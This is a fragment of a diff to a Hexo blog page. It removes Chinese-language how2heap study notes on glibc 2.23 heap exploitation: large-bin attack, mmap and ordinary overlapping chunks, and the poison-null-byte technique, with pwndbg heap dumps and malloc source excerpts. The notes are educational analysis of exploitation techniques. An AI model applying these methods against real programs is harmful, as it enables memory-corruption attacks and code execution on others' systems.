-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x603000</span><br><span class="line">Size: 0xa1</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x6030a0</span><br><span class="line">Size: 0x391</span><br><span class="line">fd: 0x7ffff7dd1b78</span><br><span class="line">bk: 0x6039a0</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x603430</span><br><span class="line">Size: 0x30</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x603460</span><br><span class="line">Size: 0x3f1</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x603850</span><br><span class="line">Size: 0x00</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x6039a0 —▸ 0x6030a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x6039a0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x500 [corrupted]</span><br><span class="line">FD: 0x603460 ◂— 0x0</span><br><span class="line">BK: 0x603460 —▸ 0x7fffffffe460 ◂— 0x0</span><br></pre></td></tr></table></figure>
-<p>最后，malloc大小为0xa0的chunk，然后我们就会惊奇地发现两个栈变量的值被修改为p3的地址。</p>
-<p>这个漏洞的利用流程就是这样，而利用的关键就是_int_malloc函数中关于large bins的处理部分。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[...]</span><br><span class="line"></span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">             &#123;</span><br><span class="line">                 victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                 victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                 fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                 victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">             &#125;</span><br><span class="line">             bck = fwd-&gt;bk;</span><br><span class="line"></span><br><span class="line">   [...]</span><br><span class="line"></span><br><span class="line">   mark_bin (av, victim_index);</span><br><span class="line">   victim-&gt;bk = bck;</span><br><span class="line">   victim-&gt;fd = fwd;</span><br><span class="line">   fwd-&gt;bk = victim;</span><br><span class="line">   bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>
-<p>由于在修改p2之后，bin的结构如图：</p>
-<p>所以遍历时会首先遍历到p1。通过源码进行调试发现这里直接跳过了else语句而从mark_bin开始执行。victim = p1，bck = fwd = main_arena + 984，这应该是p1现在的大小所对应的应该放入的small bin的位置（此时p1大小为0x391，属于small bins范围）。经历这4步之后，p1被成功链入到一个large bin中，目前一切正常。</p>
-<p>然后，_int_malloc会进行下一次循环，去处理p3。此时victim = p3，fwd = p2，bck = 0x7fffffffe460。这时，else语句中会被执行。内部4个语句执行完成后，p1，p2，p3和部分栈区结构如下：</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">addr</th>
-<th style="text-align:center">+0x0</th>
-<th style="text-align:center">+0x8</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">p1</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0x391</td>
-</tr>
-<tr>
-<td style="text-align:center">p1 + 0x10</td>
-<td style="text-align:center">&lt;small bin addr&gt;</td>
-<td style="text-align:center">&lt;small bin addr&gt;</td>
-</tr>
-<tr>
-<td style="text-align:center">…</td>
-<td style="text-align:center">…</td>
-<td style="text-align:center">…</td>
-</tr>
-<tr>
-<td style="text-align:center">p2</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0x3f1</td>
-</tr>
-<tr>
-<td style="text-align:center">p2 + 0x10</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0x7fffffffe460</td>
-</tr>
-<tr>
-<td style="text-align:center">p2 + 0x20</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">&lt;p3&gt;（原为0x7fffffffe458，第三步修改）</td>
-</tr>
-<tr>
-<td style="text-align:center">…</td>
-<td style="text-align:center">…</td>
-<td style="text-align:center">…</td>
-</tr>
-<tr>
-<td style="text-align:center">p3</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0x511</td>
-</tr>
-<tr>
-<td style="text-align:center">p3 + 0x10</td>
-<td style="text-align:center">&lt;unsorted bin head&gt;</td>
-<td style="text-align:center">&lt;unsorted bin head&gt;</td>
-</tr>
-<tr>
-<td style="text-align:center">p3 + 0x20</td>
-<td style="text-align:center">&lt;p2&gt;（第一步修改）</td>
-<td style="text-align:center">0x7fffffffe458（第二步修改）</td>
-</tr>
-<tr>
-<td style="text-align:center">…</td>
-<td style="text-align:center">…</td>
-<td style="text-align:center">…</td>
-</tr>
-<tr>
-<td style="text-align:center">(stack)</td>
-<td style="text-align:center">stack_var1 = 0</td>
-<td style="text-align:center">stack_var2 = &lt;p3&gt;（第四步修改）</td>
-</tr>
-</tbody>
-</table>
-<p>可以看到，在else语句里面，stack_var2在第4步被修改。跳出else语句之后，第四条语句<code>bck-&gt;fd = victim;</code>将stack_var1成功修改为p3的地址。至此，目标地址修改完成。stack_var1和stack_var2现在的值为p3的地址。</p>
-<h1 id="13-mmap_overlapping_chunks"><a class="markdownIt-Anchor" href="#13-mmap_overlapping_chunks"></a> 13. mmap_overlapping_chunks</h1>
-<p>源码中第一句就说，这是一个应该能够在所有libc版本中利用的漏洞。</p>
-<p>在libc中，如果用户一次性申请的内存空间过大，malloc函数不会像通常那样从堆中分配内存给用户，而是调用mmap函数为用户映射一块单独的虚拟内存使用。同样，当用户将这块空间释放时，会调用munmap函数将这块空间返还给操作系统内核。</p>
-<p>通过mmap获取的chunk在size域的bit-1上有体现。size的bit-0，bit-1，bit-2三位是用于保存控制信息的，其中bit-1就表示该chunk是否由mmap产生。mmap chunk有prev size域，它表示mmap chunk的剩余大小（内核调用mmap函数时通常会分配一块大于用户需求的内存块）。同时mmap chunk的fd和bk指针没有意义，在free时也不会放入bins中。在释放时，mmap chunk必须是页对齐的。</p>
-<p>首先，程序分配一个小chunk用于初始化堆空间。然后分配一块大小为0x100000的chunk，这第一块chunk的位置是在libc的加载地址之上的，后面又分配了2个相同大小的大chunk就在libc的加载地址之下了，空间分配大致如下表：</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">addr</th>
-<th style="text-align:center">content</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">(high address)</td>
-<td style="text-align:center">first mmap chunk</td>
-</tr>
-<tr>
-<td style="text-align:center"></td>
-<td style="text-align:center">libc</td>
-</tr>
-<tr>
-<td style="text-align:center"></td>
-<td style="text-align:center">second mmap chunk</td>
-</tr>
-<tr>
-<td style="text-align:center">(low address)</td>
-<td style="text-align:center">third mmap chunk</td>
-</tr>
-</tbody>
-</table>
-<p>此时，第三个mmap chunk的prev size为0，因为申请大小本身就是页对齐的，没有剩余空间。程序输出显示，第三个mmap chunk的size为0x101002。然后，我们只需要将这个chunk的大小改大，在释放的时候就能够将第二个mmap连带着释放掉。在程序中是将第三个chunk的size改为了0x202002，正好将第二个chunk全部覆盖。这实际上就是mmap版本的UAF。但是需要注意的是，由于munmap是将这块空间直接返还给了linux内核，因此释放后直接访问这段内存会导致程序崩溃。这点与一般的free不同。因此，现在需要做的就是将这段内存要回来，让两个指针指向相同位置。</p>
-<p>随后，第三个chunk被释放，第二个连带着被释放，接下来又分配一个大小为0x300000的chunk，这个chunk完全覆盖了第二个和第三个chunk，大小为0x301002。此时第四个chunk的初始地址比第二个chunk小0x200000，由于所有mmap chunk的类型均设定为long long，因此索引应该为0x40000，即第四个chunk下标为0x40000的地方就是第二个chunk的开头，这样就能够通过第四个chunk修改第二个chunk的值了。</p>
-<p>实际上这个漏洞还是比较好理解的，就是修改chunk的大小让chunk重叠。</p>
-<h1 id="14-overlapping_chunks"><a class="markdownIt-Anchor" href="#14-overlapping_chunks"></a> 14. overlapping_chunks</h1>
-<p>这是一个堆块重叠产生的漏洞利用。</p>
-<p>首先有4个指针p1~p4，前三个分别分配0x100，0x100，0x80大小的chunk，然后将p1中的所有字节设为1，p2所有字节设为2，p3所有字节设为3。</p>
-<p>然后将p2释放，p2会链入unsorted bin中。接下来是漏洞关键步骤：修改p2的大小，将其改大为0x180，这样p3将完全被p2重叠。之后，分配0x178大小的chunk到p4，这使得p2被重新分配出来，直接从unsorted bin中弹出。后面的过程就很好理解了，由于p4完全包含p3，这使得我们可以在p4中写入数据时随意修改p3中的值。</p>
-<p>当然，从这里看，堆块重叠只是为其他漏洞利用方式做准备。</p>
-<h1 id="15-overlapping_chunks_2"><a class="markdownIt-Anchor" href="#15-overlapping_chunks_2"></a> 15. overlapping_chunks_2</h1>
-<p>这个文件与上面的overlapping_chunks基本上相似。</p>
-<p>首先分配5个可用大小为1000的堆块，分别为p1~p5。之后释放p4，修改p2的大小使p2正好完全覆盖p3的同时保持其prev_in_use位为1。之后释放p2会将p3这块空间连带着释放掉，再将其分配回来到p6，就可以从p6里面写入数据随意修改p3的内容了。</p>
-<p>利用方式与overlapping_chunks相同，不再赘述。</p>
-<h1 id="16-poison_null_byte"><a class="markdownIt-Anchor" href="#16-poison_null_byte"></a> 16. poison_null_byte</h1>
-<p>这是一种只溢出一个字节的漏洞利用方式。前面也分析过一个类似的漏洞house_of_einherjar。与house_of_einherjar相同。这种漏洞利用也是溢出一个空字符\x00。</p>
-<p>程序首先将堆区构造成如下的结构（barrier防止top chunk的影响）：</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">addr</th>
-<th style="text-align:center">content</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">0x0</td>
-<td style="text-align:center">chunk a(size = 0x111)</td>
-</tr>
-<tr>
-<td style="text-align:center">…</td>
-<td style="text-align:center">…</td>
-</tr>
-<tr>
-<td style="text-align:center">0x110</td>
-<td style="text-align:center">chunk b(size = 0x211)</td>
-</tr>
-<tr>
-<td style="text-align:center">…</td>
-<td style="text-align:center">…</td>
-</tr>
-<tr>
-<td style="text-align:center">0x320</td>
-<td style="text-align:center">chunk c(size = 0x111)</td>
-</tr>
-<tr>
-<td style="text-align:center">…</td>
-<td style="text-align:center">…</td>
-</tr>
-<tr>
-<td style="text-align:center">0x430</td>
-<td style="text-align:center">barrier(size = 0x111)</td>
-</tr>
-</tbody>
-</table>
-<p>然后，将b释放，进入关键步骤：从a溢出一个字节到b的size使b的size从0x211修改为0x200。这样b的实际大小就缩小了0x10。由于需要绕过检查，我们要在b的结尾处伪造一个prev size，这与house_of_einherjar类似，具体请参考我的how2heap第一篇笔记。</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">addr</th>
-<th style="text-align:center">content</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">0x0</td>
-<td style="text-align:center">chunk a(size = 0x111)</td>
-</tr>
-<tr>
-<td style="text-align:center">…</td>
-<td style="text-align:center">…</td>
-</tr>
-<tr>
-<td style="text-align:center">0x110</td>
-<td style="text-align:center">chunk b(size = 0x211)</td>
-</tr>
-<tr>
-<td style="text-align:center">…</td>
-<td style="text-align:center">…</td>
-</tr>
-<tr>
-<td style="text-align:center">0x310</td>
-<td style="text-align:center">fake prev_size = 0x200</td>
-</tr>
-<tr>
-<td style="text-align:center">0x318</td>
-<td style="text-align:center">0</td>
-</tr>
-<tr>
-<td style="text-align:center">0x320</td>
-<td style="text-align:center">chunk c(size = 0x111)</td>
-</tr>
-<tr>
-<td style="text-align:center">…</td>
-<td style="text-align:center">…</td>
-</tr>
-<tr>
-<td style="text-align:center">0x430</td>
-<td style="text-align:center">barrier(size = 0x111)</td>
-</tr>
-</tbody>
-</table>
-<p>之后，分配一个大小为0x110的堆块，这个堆块的起始地址将和原b的起始地址相同，且分配之后会对假prev_size进行调整，调整为0xf0。然后继续分配一个0x90大小的空间p2，p2紧跟在p1之后。此时堆空间如图：</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">addr</th>
-<th style="text-align:center">content</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">0x0</td>
-<td style="text-align:center">chunk a(size = 0x111)</td>
-</tr>
-<tr>
-<td style="text-align:center">…</td>
-<td style="text-align:center">…</td>
-</tr>
-<tr>
-<td style="text-align:center">0x110</td>
-<td style="text-align:center">chunk b1(size = 0x111)</td>
-</tr>
-<tr>
-<td style="text-align:center">…</td>
-<td style="text-align:center">…</td>
-</tr>
-<tr>
-<td style="text-align:center">0x220</td>
-<td style="text-align:center">chunk b2(size = 0x91)</td>
-</tr>
-<tr>
-<td style="text-align:center">…</td>
-<td style="text-align:center">…</td>
-</tr>
-<tr>
-<td style="text-align:center">0x2b0</td>
-<td style="text-align:center">&lt;unsorted bin chunk&gt;(size = 0x61)</td>
-</tr>
-<tr>
-<td style="text-align:center">…</td>
-<td style="text-align:center">…</td>
-</tr>
-<tr>
-<td style="text-align:center">0x310</td>
-<td style="text-align:center">fake prev_size = 0x60</td>
-</tr>
-<tr>
-<td style="text-align:center">0x318</td>
-<td style="text-align:center">fake size = 0</td>
-</tr>
-<tr>
-<td style="text-align:center">0x320</td>
-<td style="text-align:center">chunk c(size = 0x111)</td>
-</tr>
-<tr>
-<td style="text-align:center">…</td>
-<td style="text-align:center">…</td>
-</tr>
-<tr>
-<td style="text-align:center">0x430</td>
-<td style="text-align:center">barrier(size = 0x111)</td>
-</tr>
-</tbody>
-</table>
-<p>接下来，首先释放b1，然后紧接着释放c，此时会惊奇地发现，b1和c竟然合并了。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x603000</span><br><span class="line">Size: 0x111</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x603110</span><br><span class="line">Size: 0x321</span><br><span class="line">fd: 0x6032b0</span><br><span class="line">bk: 0x7ffff7dd1b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x603430</span><br><span class="line">Size: 0x110</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x603540</span><br><span class="line">Size: 0x20ac1</span><br></pre></td></tr></table></figure>
-<p>释放c时，_int_free检查到c的prev_size对应偏移处的chunk（b1）是一个unsorted bin free chunk，因此执行了malloc_consolidate函数将二者进行了合并，但是请注意，此时的p2仍然可以进行任意读写操作，这就导致了c完全覆盖了b2，接下来我们将c重新分配回去就可以通过向c写入数据以随意修改p2的内容。</p>
-<p>理解该漏洞的核心是溢出一个字节的空字节究竟对堆空间有什么样的影响，溢出一个字节后，b的大小被改小，因此之后分配内存时，修改的prev size是一个假的prev size，下一个chunk真正的prev size不会被修改，这就为后面的堆块合并创造了条件，我们不需要修改后面一个chunk的prev size就能够让它与前面的堆块合并，造成堆块的重叠。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2186,7 +1919,7 @@ Glibc版本：Ubuntu GLIBC 2.23-0ubuntu11.3</p>
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">161</span>
+          <span class="site-state-item-count">162</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -2244,7 +1977,7 @@ Glibc版本：Ubuntu GLIBC 2.23-0ubuntu11.3</p>
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">22:32</span>
+    <span title="站点阅读时长">22:54</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
   </div>
